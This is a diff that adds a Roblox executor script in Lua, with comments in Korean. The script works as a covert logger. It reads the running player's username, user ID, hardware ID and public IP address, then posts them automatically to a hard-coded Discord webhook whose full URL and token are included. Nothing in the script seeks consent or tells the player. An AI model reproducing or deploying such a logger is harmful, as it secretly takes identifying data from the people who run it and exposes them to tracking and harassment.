@@ -1,0 +1,89 @@
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1558364015200178207/c6sTpDtxQkIGXXQerB917v3QO9JlHiMEpyvmtgq9tuQhJ7LXeRR0oW5WvV18ijHqc4hM"
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local player = Players.LocalPlayer
+
+local httpRequest = (syn and syn.request)
+    or (http and http.request)
+    or http_request
+    or request
+
+local function sendLog()
+    if not httpRequest then
+        warn("HTTP 요청을 지원하지 않습니다.")
+        return
+    end
+
+    -- HWID
+    local hwid = "unknown"
+    if gethwid then
+        hwid = tostring(gethwid())
+    elseif get_hwid then
+        hwid = tostring(get_hwid())
+    elseif syn and syn.get_hwid then
+        hwid = tostring(syn.get_hwid())
+    end
+
+    -- IP (개선된 버전)
+    local ip = "unknown"
+    local success, err = pcall(function()
+        local res = httpRequest({
+            Url = "https://api.ipify.org?format=json",
+            Method = "GET",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            }
+        })
+
+        if res and res.Body then
+            local data = HttpService:JSONDecode(res.Body)
+            if data and data.ip then
+                ip = data.ip
+            end
+        end
+    end)
+
+    if not success then
+        warn("IP 가져오기 실패:", err)
+    end
+    print("가져온 IP:", ip)
+
+    local userId = player.UserId
+    local executor = (identifyexecutor and identifyexecutor()) or "unknown"
+
+    local payload = {
+        username = "Script Logger",
+        embeds = {{
+            title = "스크립트 실행 감지",
+            color = 16711680,
+            fields = {
+                { name = "유저명", value = player.Name, inline = true },
+                { name = "표시 이름", value = player.DisplayName, inline = true },
+                { name = "User ID", value = tostring(userId), inline = true },
+                { name = "프로필", value = "https://www.roblox.com/users/" .. userId .. "/profile" },
+                { name = "Place ID", value = tostring(game.PlaceId), inline = true },
+                { name = "Job ID", value = tostring(game.JobId), inline = true },
+                { name = "Executor", value = executor, inline = true },
+                { name = "HWID", value = hwid, inline = true },
+                { name = "IP", value = ip, inline = true },
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        }},
+    }
+
+    local success2, err2 = pcall(function()
+        local res = httpRequest({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(payload),
+        })
+        print("웹훅 응답 코드:", res and res.StatusCode or "응답 없음")
+    end)
+
+    if not success2 then
+        warn("웹훅 전송 실패:", err2)
+    end
+end
+
+task.spawn(sendLog)
